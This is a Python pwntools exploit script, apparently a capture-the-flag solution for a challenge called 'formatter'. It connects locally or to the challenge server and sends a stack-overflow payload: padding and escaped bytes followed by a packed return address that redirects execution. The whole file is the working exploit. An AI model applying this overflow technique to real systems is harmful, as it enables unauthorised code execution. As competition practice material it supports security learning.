#!/usr/bin/env python3

from pwn import *

elf = ELF("./formatter_patched")

context.binary = elf
context.terminal = ()

def conn():
    if args.REMOTE:
        p = remote("formatter.challs.olicyber.it", 20006)
    elif args.GDB:
        p = gdb.debug([elf.path], ''' 
            b main
            b format          
            c 

        ''')
    else:
        p = process([elf.path])

    return p


def main():
    p = conn()
    p.recvline()
    p.interactive()
    # p.recvuntil(b'ata!\n')
    payload = b'\\f'*12 + b'a'*32+ p64(0X401255)
    print(len(payload))
    p.sendline(payload)


    p.interactive()


if __name__ == "__main__":
    main()
